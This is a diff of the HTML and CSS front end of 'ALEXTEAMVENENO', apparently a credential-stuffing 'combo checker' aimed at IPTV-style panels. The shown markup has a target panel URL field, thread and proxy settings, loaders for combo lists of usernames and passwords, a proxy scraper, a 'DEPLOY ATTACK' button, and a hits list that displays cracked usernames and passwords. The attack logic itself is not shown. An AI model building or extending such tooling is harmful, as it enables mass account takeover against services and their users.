@@ -2,245 +2,329 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src * http://* https://*; img-src * data:;">
-    <title>☢️ ALEXTEAMVENENO · DRAGÓN CYBERPUNK</title>
+    <meta name="theme-color" content="#050508">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>☢️ ALEXTEAMVENENO</title>
     <style>
         :root {
-            --neon-magenta: #ff00ff;
-            --neon-cyan: #00ffff;
-            --neon-green: #00ff41;
-            --neon-yellow: #ffe600;
-            --neon-orange: #ff6a00;
-            --neon-red: #ff0040;
-            --neon-purple: #b300ff;
-            --dragon-fire: #ff4500;
-            --dragon-venom: #9b00ff;
-            --bg-deep: #050508;
-            --bg-card: rgba(13,13,26,0.85);
-            --text-dim: #7a7a9a;
-            --text-body: #c0c0e0;
-            --text-bright: #e8e8ff;
+            --bg: #050508; --card: #0a0a15; --border: #1a1a2e;
+            --purple: #a855f7; --green: #10b981; --red: #ef4444;
+            --cyan: #06b6d4; --orange: #f59e0b; --text: #e2e8f0; --muted: #94a3b8;
+            --touch: 48px;
         }
-
-        * { margin:0; padding:0; box-sizing:border-box; }
-
+        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
         body {
-            background: var(--bg-deep);
-            background-image:
-                linear-gradient(rgba(255,0,255,0.02) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255,0,255,0.02) 1px, transparent 1px),
-                radial-gradient(ellipse at center, transparent 30%, rgba(0,0,0,0.8) 100%);
-            background-size: 40px 40px, 40px 40px, 100% 100%;
-            background-position: center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            color: var(--text-body);
-            font-family: 'Courier New', 'Consolas', monospace;
-            min-height: 100vh;
-            overflow-x: hidden;
-            position: relative;
-            -webkit-tap-highlight-color: transparent;
+            background: var(--bg); color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh; min-height: -webkit-fill-available;
+            overflow-x: hidden; font-size: 14px; line-height: 1.4;
+            -webkit-user-select: none; user-select: none;
         }
-
-        body::before {
-            content: '';
-            position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
-            pointer-events: none; z-index: 0;
+        #loginScreen {
+            position: fixed; inset: 0; z-index: 100; display: flex;
+            align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.9); padding: 20px;
         }
-
-        body::after {
-            content: '';
-            position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
-            pointer-events: none; z-index: 9999;
-            animation: scanlines 0.1s linear infinite;
+        .login-box {
+            background: var(--card); border: 1px solid var(--border); border-radius: 16px;
+            padding: 30px 24px; width: 100%; max-width: 380px; text-align: center;
         }
+        .login-logo { font-size: 3em; margin-bottom: 8px; }
+        .login-brand { font-size: 1.3em; font-weight: 900; color: var(--purple); letter-spacing: 2px; margin-bottom: 20px; }
+        .login-input {
+            width: 100%; background: #0f0f1e; border: 1px solid var(--border); border-radius: 12px;
+            padding: 14px 16px; color: #fff; font-size: 1em; margin-bottom: 12px; outline: none;
+            min-height: var(--touch);
+        }
+        .login-input:focus { border-color: var(--purple); }
+        .login-btn {
+            width: 100%; background: var(--purple); color: #fff; border: none;
+            border-radius: 12px; padding: 14px; font-size: 1em; font-weight: 700;
+            cursor: pointer; min-height: var(--touch); letter-spacing: 1px;
+        }
+        .login-btn:active { opacity: 0.8; transform: scale(0.98); }
+        .login-error { color: var(--red); font-size: 0.85em; margin-top: 8px; display: none; }
 
-        @keyframes scanlines { 0% { transform: translateY(0); } 100% { transform: translateY(4px); } }
+        #welcomeScreen {
+            position: fixed; inset: 0; z-index: 99; display: none;
+            align-items: center; justify-content: center; flex-direction: column;
+            background: rgba(0,0,0,0.95); padding: 20px;
+        }
+        .welcome-emoji { font-size: 5em; animation: pulse 1s infinite; }
+        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.1)} }
+        .welcome-text { font-size: 1.4em; font-weight: 900; color: var(--purple); margin: 10px 0; }
+        .welcome-sub { color: var(--muted); font-size: 0.9em; }
+        .welcome-bar { width: 200px; height: 4px; background: #1a1a2e; border-radius: 2px; margin: 15px 0; overflow: hidden; }
+        .welcome-bar-fill { height: 100%; background: var(--purple); width: 0%; animation: fillBar 2.5s forwards; }
+        @keyframes fillBar { to { width: 100%; } }
 
-        .content-wrapper { position: relative; z-index: 1; display: none; }
-
-        #loginScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); }
-        .login-box { background: rgba(10,5,20,0.95); border: 2px solid var(--neon-magenta); border-radius: 8px; padding: 35px 28px; width: 400px; max-width: 92vw; box-shadow: 0 0 30px rgba(255,0,255,0.3), 0 0 60px rgba(255,0,255,0.12), inset 0 0 50px rgba(255,0,255,0.03); animation: loginGlow 3s ease-in-out infinite alternate; position: relative; }
-        @keyframes loginGlow { 0% { box-shadow: 0 0 20px rgba(255,0,255,0.2); } 100% { box-shadow: 0 0 35px rgba(255,0,255,0.4); } }
-        .login-box::before { content: ''; position: absolute; top: -2px; left: 15px; right: 15px; height: 2px; background: linear-gradient(90deg, transparent, var(--neon-magenta), var(--neon-cyan), var(--neon-magenta), transparent); background-size: 200% 100%; animation: topBar 3s linear infinite; }
-        @keyframes topBar { 0% { background-position: -200% center; } 100% { background-position: 200% center; } }
-        .login-logo { text-align: center; font-size: 2.8em; margin-bottom: 4px; animation: logoPulse 1.5s ease-in-out infinite; }
-        @keyframes logoPulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
-        .login-brand { text-align: center; font-size: 1.3em; font-weight: 900; letter-spacing: 4px; margin-bottom: 4px; background: linear-gradient(90deg, var(--neon-magenta), var(--neon-cyan), var(--neon-magenta)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; animation: glitchText 5s linear infinite; }
-        @keyframes glitchText { 0%,100% { opacity: 1; } 2% { opacity: 0.7; transform: translateX(-2px); } 4% { opacity: 1; transform: translateX(0); } }
-        .login-version { text-align: center; font-size: 0.6em; letter-spacing: 3px; color: var(--text-dim); margin-bottom: 28px; }
-        .input-group { margin-bottom: 16px; }
-        .input-group label { display: block; font-size: 0.7em; letter-spacing: 2px; color: var(--neon-cyan); margin-bottom: 6px; font-weight: bold; }
-        .input-group input { width: 100%; background: rgba(5,5,15,0.95); border: 1px solid rgba(0,255,255,0.3); border-radius: 4px; padding: 12px 14px; color: #fff; font-family: 'Courier New', 'Consolas', monospace; font-size: 0.9em; letter-spacing: 1px; transition: all 0.3s ease; outline: none; }
-        .input-group input:focus { border-color: var(--neon-magenta); box-shadow: 0 0 20px rgba(255,0,255,0.25); }
-        .btn-login { width: 100%; background: linear-gradient(135deg, rgba(180,0,60,0.9), rgba(255,0,64,0.9)); border: 2px solid var(--neon-red); border-radius: 4px; padding: 14px; color: #fff; font-family: 'Courier New', 'Consolas', monospace; font-size: 0.9em; font-weight: 900; letter-spacing: 3px; cursor: pointer; text-transform: uppercase; margin-top: 10px; transition: all 0.3s ease; animation: btnPulse 2s ease-in-out infinite; }
-        @keyframes btnPulse { 0%,100% { box-shadow: 0 0 10px var(--neon-red); } 50% { box-shadow: 0 0 25px var(--neon-red); } }
-        .btn-login:active { transform: scale(0.96); }
-        .login-error { text-align: center; color: var(--neon-red); font-size: 0.7em; letter-spacing: 1px; margin-top: 12px; display: none; }
-        .login-footer { text-align: center; font-size: 0.5em; letter-spacing: 2px; color: var(--neon-magenta); margin-top: 18px; opacity: 0.5; }
-
-        #welcomeScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; display: none; align-items: center; justify-content: center; background: rgba(0,0,0,0.92); flex-direction: column; }
-        .dragon-container { text-align: center; animation: dragonEntrance 0.8s ease-out; }
-        @keyframes dragonEntrance { 0% { transform: scale(0) rotate(-180deg); opacity: 0; } 60% { transform: scale(1.1) rotate(5deg); opacity: 1; } 100% { transform: scale(1) rotate(0deg); opacity: 1; } }
-        .fire-particles { display: flex; justify-content: center; gap: 8px; margin-bottom: 5px; height: 40px; }
-        .fire-particle { font-size: 1.5em; animation: fireUp 1s ease-in-out infinite; }
-        .fire-particle:nth-child(1) { animation-delay: 0s; } .fire-particle:nth-child(2) { animation-delay: 0.15s; } .fire-particle:nth-child(3) { animation-delay: 0.3s; } .fire-particle:nth-child(4) { animation-delay: 0.45s; } .fire-particle:nth-child(5) { animation-delay: 0.6s; } .fire-particle:nth-child(6) { animation-delay: 0.75s; } .fire-particle:nth-child(7) { animation-delay: 0.9s; }
-        @keyframes fireUp { 0% { transform: translateY(0) scale(1); opacity: 1; } 50% { transform: translateY(-25px) scale(1.5); opacity: 0.7; } 100% { transform: translateY(-50px) scale(0.8); opacity: 0; } }
-        .dragon-row { display: flex; align-items: center; justify-content: center; gap: 15px; margin: 10px 0; }
-        .dragon-head { font-size: 5em; animation: dragonPulse 1.5s ease-in-out infinite; filter: drop-shadow(0 0 20px var(--dragon-fire)) drop-shadow(0 0 40px var(--dragon-venom)); }
-        @keyframes dragonPulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
-        .dragon-title { font-size: 1.6em; font-weight: 900; letter-spacing: 4px; margin: 10px 0; background: linear-gradient(90deg, var(--dragon-fire), var(--neon-orange), var(--dragon-venom), var(--neon-magenta)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        .dragon-info { background: rgba(20,5,35,0.9); border: 1px solid var(--dragon-venom); border-radius: 5px; padding: 12px 20px; margin: 10px auto; max-width: 350px; font-size: 0.7em; letter-spacing: 1px; color: var(--text-bright); }
-        .dragon-info span { color: var(--dragon-fire); font-weight: bold; }
-        .dragon-progress { width: 280px; height: 6px; background: rgba(50,5,50,0.8); border-radius: 3px; overflow: hidden; margin: 15px auto; border: 1px solid var(--dragon-venom); }
-        .dragon-progress-fill { height: 100%; background: linear-gradient(90deg, var(--dragon-fire), var(--neon-orange), var(--dragon-venom)); width: 0%; animation: progressFill 3s ease-in-out forwards; }
-        @keyframes progressFill { 0% { width: 0%; } 100% { width: 100%; } }
-        .dragon-status { font-size: 0.65em; color: var(--neon-orange); letter-spacing: 2px; margin: 8px 0; }
-        .lang-selector { display: flex; gap: 10px; justify-content: center; margin-top: 15px; flex-wrap: wrap; }
-        .lang-btn { font-size: 1.8em; cursor: pointer; padding: 10px 18px; border-radius: 8px; border: 2px solid rgba(255,255,255,0.15); background: rgba(20,5,35,0.8); transition: all 0.3s ease; opacity: 0.7; }
-        .lang-btn.selected { border-color: var(--dragon-fire); box-shadow: 0 0 30px rgba(255,69,0,0.7); opacity: 1; }
-        .lang-label { font-size: 0.55em; color: var(--text-dim); letter-spacing: 2px; margin-top: 5px; }
-
-        .banner { background: linear-gradient(135deg, rgba(10,5,20,0.9), rgba(20,5,35,0.9), rgba(5,15,30,0.9)); border: 2px solid var(--neon-magenta); border-radius: 3px; padding: 10px 12px; text-align: center; font-size: 1.1em; font-weight: 900; letter-spacing: 3px; margin: 8px; color: #fff; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .signature { text-align: center; font-size: 0.55em; letter-spacing: 2px; color: var(--neon-magenta); opacity: 0.7; }
-        .main-container { display: flex; gap: 8px; padding: 0 8px 8px 8px; height: calc(100vh - 130px); }
-        .left-panel { flex: 0 0 340px; background: rgba(8,8,18,0.88); border: 1px solid rgba(255,0,255,0.2); border-radius: 4px; padding: 8px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
-        .right-panel { flex: 1; display: flex; flex-direction: column; gap: 6px; }
-        .card { background: rgba(13,13,26,0.82); border: 1px solid rgba(0,255,255,0.12); border-radius: 3px; padding: 8px; }
-        .card-title { font-size: 0.7em; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 6px; padding-bottom: 5px; border-bottom: 1px solid rgba(255,0,255,0.2); background: linear-gradient(90deg, var(--neon-magenta), var(--neon-cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        input[type="text"], input[type="number"], select { width: 100%; background: rgba(10,10,25,0.9); border: 1px solid rgba(0,255,255,0.25); border-radius: 2px; padding: 6px 8px; color: var(--neon-cyan); font-family: 'Courier New', 'Consolas', monospace; font-size: 0.75em; }
-        input:focus, select:focus { outline: none; border-color: var(--neon-magenta); }
-        select { cursor: pointer; appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='10' fill='%23ff00ff' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 8px center; }
-        select option { background: #0a0a15; color: var(--neon-cyan); }
-        button { background: rgba(15,15,35,0.9); border: 1px solid rgba(255,0,255,0.3); border-radius: 2px; padding: 6px 10px; color: var(--text-bright); cursor: pointer; font-weight: 600; font-size: 0.72em; letter-spacing: 1px; font-family: 'Courier New', 'Consolas', monospace; transition: all 0.25s ease; text-transform: uppercase; white-space: nowrap; }
-        button:active { transform: scale(0.95); }
-        .btn-start { background: linear-gradient(135deg, rgba(180,0,50,0.9), rgba(255,0,64,0.9)); border: 2px solid var(--neon-red); font-size: 0.9em; padding: 12px; width: 100%; font-weight: 900; letter-spacing: 3px; }
-        .btn-start:disabled { opacity: 0.4; cursor: not-allowed; }
-        .btn-stop { background: linear-gradient(135deg, rgba(100,0,100,0.9), rgba(150,0,80,0.9)); border: 2px solid var(--neon-purple); font-size: 0.9em; padding: 12px; width: 100%; font-weight: 900; letter-spacing: 3px; }
-        .btn-stop:disabled { opacity: 0.4; cursor: not-allowed; }
-        .btn-save { background: rgba(0,80,40,0.9); border: 1px solid var(--neon-green); color: var(--neon-green); font-size: 0.75em; padding: 8px 14px; }
-        .btn-clear { background: rgba(40,0,20,0.9); border-color: rgba(255,0,64,0.4); color: var(--neon-red); font-size: 0.65em; padding: 4px 7px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px; }
-        .stat-box { background: rgba(15,15,30,0.8); border: 1px solid rgba(0,255,255,0.1); border-radius: 2px; padding: 6px 3px; text-align: center; font-size: 0.6em; color: var(--text-dim); }
-        .stat-value { font-size: 1.4em; font-weight: 900; display: block; margin-top: 2px; }
-        .stat-hits .stat-value { color: var(--neon-green); }
-        .stat-errors .stat-value { color: var(--neon-red); }
-        .console { background: rgba(5,5,15,0.95); border: 1px solid rgba(0,255,65,0.2); border-radius: 2px; padding: 8px; flex: 1; overflow-y: auto; font-size: 0.68em; line-height: 1.5; min-height: 80px; color: var(--neon-green); white-space: pre-wrap; word-break: break-all; }
-        .console .log-hit { color: var(--neon-green); font-weight: bold; }
-        .console .log-err { color: var(--neon-red); }
-        .console .log-warn { color: var(--neon-orange); }
-        .console .log-info { color: #7a7aaa; }
-        .table-container { flex: 1; overflow-y: auto; overflow-x: auto; border: 1px solid rgba(0,255,255,0.15); border-radius: 3px; min-height: 150px; }
-        .hits-table { width: 100%; border-collapse: collapse; font-size: 0.75em; min-width: 800px; }
-        .hits-table thead th { background: rgba(20,5,35,0.95); color: var(--neon-magenta); padding: 8px 5px; text-align: left; border: 1px solid rgba(255,0,255,0.2); position: sticky; top: 0; z-index: 2; font-size: 0.8em; white-space: nowrap; }
-        .hits-table tbody td { padding: 6px 5px; border: 1px solid rgba(0,255,255,0.08); color: var(--text-bright); font-size: 0.82em; white-space: nowrap; }
-        .hits-table tbody tr { cursor: pointer; }
-        .hits-table tbody tr:nth-child(even) { background: rgba(255,0,255,0.02); }
-        .m3u-cell { display: flex; align-items: center; gap: 4px; }
-        .progress-bar { height: 16px; background: rgba(10,10,25,0.9); border-radius: 2px; overflow: hidden; border: 1px solid rgba(255,0,255,0.25); margin: 4px 0; }
-        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--neon-purple), var(--neon-magenta)); transition: width 0.3s; width: 0%; }
-        .progress-text { text-align: center; font-size: 0.65em; color: var(--neon-cyan); }
+        #dashboard { display: none; padding: 8px; padding-bottom: 100px; max-width: 700px; margin: 0 auto; }
+        .header {
+            display: flex; align-items: center; gap: 10px; padding: 10px 12px;
+            background: var(--card); border: 1px solid var(--border); border-radius: 12px;
+            margin-bottom: 8px; position: sticky; top: 8px; z-index: 50;
+        }
+        .header-logo { font-size: 1.5em; }
+        .header-title { font-weight: 900; color: var(--purple); font-size: 0.95em; flex: 1; }
+        .header-btn {
+            background: transparent; border: 1px solid var(--border); color: var(--muted);
+            padding: 8px 12px; border-radius: 8px; font-size: 0.8em; cursor: pointer; min-height: 36px;
+        }
+        .section {
+            background: var(--card); border: 1px solid var(--border); border-radius: 12px;
+            padding: 12px; margin-bottom: 8px;
+        }
+        .section-title {
+            font-size: 0.7em; font-weight: 700; color: var(--muted);
+            letter-spacing: 1px; margin-bottom: 8px; text-transform: uppercase;
+        }
         .row { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
-        .col { flex: 1; }
-        label { font-size: 0.68em; color: var(--text-dim); display: block; margin-bottom: 2px; }
-        .checkbox-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
-        input[type="checkbox"] { accent-color: var(--neon-magenta); width: 16px; height: 16px; cursor: pointer; }
-        .lang-indicator { position: fixed; bottom: 10px; right: 10px; z-index: 50; font-size: 1.2em; cursor: pointer; opacity: 0.6; }
-        .toast { position: fixed; top: 15px; right: 15px; background: rgba(15,5,25,0.95); border: 2px solid var(--neon-magenta); border-radius: 3px; padding: 12px 18px; color: #fff; z-index: 10001; font-size: 0.85em; display: none; max-width: 90vw; }
-        .footer-signature { text-align: center; padding: 3px; font-size: 0.5em; letter-spacing: 2px; color: var(--neon-magenta); opacity: 0.5; }
-        ::-webkit-scrollbar { width: 5px; height: 5px; }
-        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.5); }
-        ::-webkit-scrollbar-thumb { background: rgba(255,0,255,0.35); border-radius: 3px; }
+        .input {
+            flex: 1; background: #0f0f1e; border: 1px solid var(--border); border-radius: 10px;
+            padding: 12px; color: #fff; font-size: 0.9em; outline: none; min-height: 44px;
+            min-width: 120px;
+        }
+        .input:focus { border-color: var(--purple); }
+        select {
+            background: #0f0f1e; border: 1px solid var(--border); border-radius: 10px;
+            padding: 10px 12px; color: #fff; font-size: 0.85em; outline: none; min-height: 44px;
+        }
+        select:focus { border-color: var(--purple); }
+        .btn {
+            background: var(--purple); color: #fff; border: none; border-radius: 10px;
+            padding: 12px 14px; font-weight: 700; cursor: pointer; font-size: 0.85em;
+            min-height: 44px; white-space: nowrap; letter-spacing: 0.5px;
+            display: inline-flex; align-items: center; gap: 4px; justify-content: center;
+        }
+        .btn:active { opacity: 0.8; transform: scale(0.97); }
+        .btn-block { width: 100%; }
+        .btn-green { background: var(--green); }
+        .btn-red { background: var(--red); }
+        .btn-cyan { background: transparent; border: 1px solid var(--cyan); color: var(--cyan); }
+        .btn-outline { background: transparent; border: 1px solid var(--border); color: var(--text); }
+        .btn-sm { padding: 8px 12px; font-size: 0.75em; min-height: 36px; }
 
-        @media (max-width: 900px) {
-            .main-container { flex-direction: column; height: auto; }
-            .left-panel { flex: none; max-height: 45vh; position: sticky; top: 8px; z-index: 5; }
-            .banner { font-size: 0.85em; }
-            .stats-grid { grid-template-columns: repeat(2, 1fr); }
-            .dragon-head { font-size: 3.5em; }
-            .dragon-title { font-size: 1.2em; }
+        .stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 6px; }
+        .stat { background: #0f0f1e; border-radius: 10px; padding: 10px 6px; text-align: center; }
+        .stat-val { font-size: 1.3em; font-weight: 900; }
+        .stat-val.green { color: var(--green); }
+        .stat-val.red { color: var(--red); }
+        .stat-val.cyan { color: var(--cyan); }
+        .stat-lbl { font-size: 0.6em; color: var(--muted); text-transform: uppercase; }
+        .progress-bar { height: 6px; background: #1a1a2e; border-radius: 3px; margin: 8px 0; }
+        .progress-fill { height: 100%; background: var(--purple); border-radius: 3px; width: 0%; transition: width 0.3s; }
+        .progress-text { font-size: 0.65em; color: var(--muted); text-align: center; }
+
+        .console {
+            background: #000; border: 1px solid var(--border); border-radius: 10px;
+            padding: 10px; max-height: 100px; overflow-y: auto; font-family: monospace;
+            font-size: 0.68em; color: var(--green); line-height: 1.5; margin-top: 6px;
+        }
+        .console .h { color: var(--green); font-weight: bold; }
+        .console .e { color: var(--red); }
+        .console .i { color: #7a7aaa; }
+
+        .hit-card {
+            background: #0f0f1e; border: 1px solid var(--border); border-radius: 10px;
+            padding: 10px 12px; margin-bottom: 6px; cursor: pointer; transition: all 0.15s;
+            position: relative;
+        }
+        .hit-card:active { background: #1a1a30; border-color: var(--purple); }
+        .hit-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px; }
+        .hit-user { font-weight: 700; color: #fff; font-size: 0.95em; }
+        .hit-pass { color: var(--green); font-size: 0.85em; }
+        .hit-panel { color: var(--cyan); font-size: 0.7em; }
+        .hit-info { display: flex; gap: 8px; margin-top: 4px; font-size: 0.7em; color: var(--muted); flex-wrap: wrap; }
+        .hit-info span { color: var(--orange); }
+        .hit-actions { display: flex; gap: 4px; margin-top: 6px; }
+        .hit-copy-btn {
+            background: rgba(168,85,247,0.2); color: var(--purple); border: 1px solid rgba(168,85,247,0.3);
+            border-radius: 6px; padding: 6px 10px; font-size: 0.68em; font-weight: 700;
+            cursor: pointer; min-height: 32px;
+        }
+        .hit-copy-btn:active { background: rgba(168,85,247,0.4); }
+
+        .modal-overlay {
+            position: fixed; inset: 0; z-index: 200; background: rgba(0,0,0,0.9);
+            display: none; align-items: flex-end; justify-content: center;
+        }
+        .modal-overlay.show { display: flex; }
+        .modal-content {
+            background: var(--card); border: 1px solid var(--border); border-radius: 16px 16px 0 0;
+            padding: 20px 16px; width: 100%; max-height: 70vh; overflow-y: auto;
+        }
+        .modal-handle { width: 40px; height: 4px; background: var(--border); border-radius: 2px; margin: 0 auto 15px; }
+        .modal-title { font-weight: 900; margin-bottom: 10px; color: var(--purple); font-size: 1em; }
+        .cat-tag {
+            display: inline-block; background: rgba(168,85,247,0.15); color: var(--purple);
+            border-radius: 15px; padding: 5px 10px; margin: 2px; font-size: 0.75em;
+        }
+        .modal-close {
+            width: 100%; background: var(--red); color: #fff; border: none;
+            border-radius: 10px; padding: 14px; font-weight: 700; cursor: pointer;
+            margin-top: 12px; min-height: 44px;
+        }
+
+        .toast {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            background: var(--green); color: #000; padding: 10px 20px; border-radius: 25px;
+            font-weight: 700; font-size: 0.85em; z-index: 300; transition: all 0.3s;
+            opacity: 0; pointer-events: none; white-space: nowrap;
+        }
+        .toast.show { opacity: 1; }
+        .toast.err { background: var(--red); color: #fff; }
+
+        .empty { text-align: center; color: var(--muted); padding: 30px 20px; font-size: 0.85em; }
+
+        .checkbox-inline { display: flex; gap: 12px; flex-wrap: wrap; font-size: 0.75em; color: var(--muted); }
+        .checkbox-inline label { display: flex; align-items: center; gap: 4px; cursor: pointer; }
+        .checkbox-inline input { accent-color: var(--purple); width: 16px; height: 16px; }
+
+        @media (min-width: 600px) {
+            #dashboard { padding: 12px; padding-bottom: 100px; }
+            .stats-row { grid-template-columns: repeat(4, 1fr); }
         }
     </style>
 </head>
 <body>
 
+    <!-- LOGIN -->
     <div id="loginScreen">
         <div class="login-box">
             <div class="login-logo">☢️</div>
             <div class="login-brand">ALEXTEAMVENENO</div>
-            <div class="login-version">[ DRAGÓN CYBERPUNK v16 · PROXY CORS ]</div>
-            <div class="input-group"><label>👤 USUARIO</label><input type="text" id="loginUser" placeholder="Ingresa tu usuario..." autocomplete="off"></div>
-            <div class="input-group"><label>🔑 CONTRASEÑA</label><input type="password" id="loginPass" placeholder="Ingresa tu contraseña..."></div>
-            <button class="btn-login" onclick="doLogin()">🚀 ACCEDER AL SISTEMA</button>
+            <input class="login-input" type="text" id="loginUser" placeholder="Usuario" autocomplete="off">
+            <input class="login-input" type="password" id="loginPass" placeholder="Contraseña">
+            <button class="login-btn" onclick="doLogin()">🚀 ACCEDER</button>
             <div class="login-error" id="loginError">⚠️ Credenciales incorrectas</div>
-            <div class="login-footer">[ ALEXTEAMVENENO ]</div>
         </div>
     </div>
 
+    <!-- BIENVENIDA -->
     <div id="welcomeScreen">
-        <div class="dragon-container">
-            <div class="fire-particles"><span class="fire-particle">🔥</span><span class="fire-particle">🔥</span><span class="fire-particle">🔥</span><span class="fire-particle">🔥</span><span class="fire-particle">🔥</span><span class="fire-particle">🔥</span><span class="fire-particle">🔥</span></div>
-            <div class="dragon-row"><span class="dragon-head">🐉</span><span class="dragon-head">☢️</span><span class="dragon-head">🐉</span></div>
-            <div class="fire-particles" style="margin-top:-10px;"><span class="fire-particle" style="animation-delay:0.5s;">🔥</span><span class="fire-particle" style="animation-delay:0.65s;">🔥</span><span class="fire-particle" style="animation-delay:0.8s;">🔥</span><span class="fire-particle" style="animation-delay:0.95s;">🔥</span><span class="fire-particle" style="animation-delay:1.1s;">🔥</span></div>
-            <div class="dragon-title" id="dragonTitle">EL DRAGÓN HA DESPERTADO</div>
-            <div class="dragon-info"><span>🐉 JINETE:</span> ALEX<br><span>☢️ DRAGÓN:</span> VENENO TÓXICO<br><span>💀 ALIENTO:</span> LETAL<br><span>🎯 ESTADO:</span> <span id="dragonStatus">CAZANDO</span></div>
-            <div class="dragon-status" id="dragonLoading">🔥 INYECTANDO VENENO AL SISTEMA...</div>
-            <div class="dragon-progress"><div class="dragon-progress-fill"></div></div>
-            <div style="margin-top:15px; text-align:center;">
-                <div class="lang-selector">
-                    <div class="lang-btn selected">🇪🇸<div class="lang-label">ESPAÑOL</div></div>
-                </div>
+        <div class="welcome-emoji">🐉</div>
+        <div class="welcome-text">EL DRAGÓN DESPIERTA</div>
+        <div class="welcome-sub">ALEXTEAMVENENO</div>
+        <div class="welcome-bar"><div class="welcome-bar-fill"></div></div>
+    </div>
+
+    <!-- DASHBOARD -->
+    <div id="dashboard">
+        <div class="header">
+            <span class="header-logo">☢️</span>
+            <span class="header-title">ALEXTEAMVENENO</span>
+            <button class="header-btn" onclick="doLogout()" title="Salir">🚪</button>
+        </div>
+
+        <!-- CONFIG -->
+        <div class="section">
+            <div class="section-title">⚙️ CONFIGURACIÓN</div>
+            <label style="font-size:0.7em;color:var(--muted);">🌐 URL DEL PANEL</label>
+            <input class="input" type="text" id="portals" placeholder="panel.com:80" style="margin-bottom:6px;">
+            <div class="row">
+                <input class="input" type="number" id="threads" value="20" min="1" max="50" placeholder="Threads" style="max-width:80px;">
+                <select id="proxyType" style="flex:1;">
+                    <option value="0">SOCKS5h</option>
+                    <option value="1">HTTP</option>
+                    <option value="2">SOCKS4</option>
+                    <option value="3">SOCKS5</option>
+                </select>
             </div>
+            <div class="checkbox-inline" style="margin-top:6px;">
+                <label><input type="checkbox" id="useHttps"> SSL</label>
+                <label><input type="checkbox" id="useProxies"> PROXY</label>
+                <label><input type="checkbox" id="logInfo" checked> INFO</label>
+                <label><input type="checkbox" id="logHits" checked> HITS</label>
+                <label><input type="checkbox" id="logErrors" checked> ERR</label>
+            </div>
+        </div>
+
+        <!-- BOTONES ACCIÓN -->
+        <div class="row" style="margin-bottom:8px;">
+            <button class="btn btn-block" onclick="document.getElementById('comboFile').click()">📂 CARGAR COMBO</button>
+            <input type="file" id="comboFile" accept=".txt" style="display:none;" onchange="handleComboFile(event)">
+            <button class="btn btn-outline btn-sm" onclick="document.getElementById('proxyFile').click()">🔄 PROXY</button>
+            <input type="file" id="proxyFile" accept=".txt" style="display:none;" onchange="handleProxyFile(event)">
+            <button class="btn btn-cyan btn-sm" onclick="scrapeProxies()" id="btnScrape">🌐 SCRAPE</button>
+        </div>
+        <span id="comboStatus" style="font-size:0.65em;color:var(--cyan);">0 combos</span> |
+        <span id="proxyStatus" style="font-size:0.65em;color:var(--cyan);">0 proxies</span>
+
+        <!-- STATS -->
+        <div class="section" style="margin-top:8px;">
+            <div class="stats-row">
+                <div class="stat"><div class="stat-val cyan" id="statChecked">0</div><div class="stat-lbl">SCANNED</div></div>
+                <div class="stat"><div class="stat-val green" id="statHits">0</div><div class="stat-lbl">HITS</div></div>
+                <div class="stat"><div class="stat-val red" id="statErrors">0</div><div class="stat-lbl">ERRORS</div></div>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+            <div class="progress-text" id="progressText">[ 0 / 0 ] 0%</div>
+        </div>
+
+        <!-- CONTROLES -->
+        <div class="row" style="margin-bottom:8px;">
+            <button class="btn btn-green btn-block" id="btnStart" onclick="startScan()">🚀 DEPLOY ATTACK</button>
+            <button class="btn btn-red btn-block" id="btnStop" onclick="stopScan()" disabled>⬛ STOP</button>
+        </div>
+
+        <!-- CONSOLA -->
+        <div class="console" id="console">> ALEXTEAMVENENO v17 · Listo</div>
+
+        <!-- HITS -->
+        <div class="section">
+            <div class="section-title">⭐ HITS ENCONTRADOS <span id="hitCount" style="color:var(--green);">0</span></div>
+            <div id="hitsContainer">
+                <div class="empty">👆 Carga un combo y despliega el ataque</div>
+            </div>
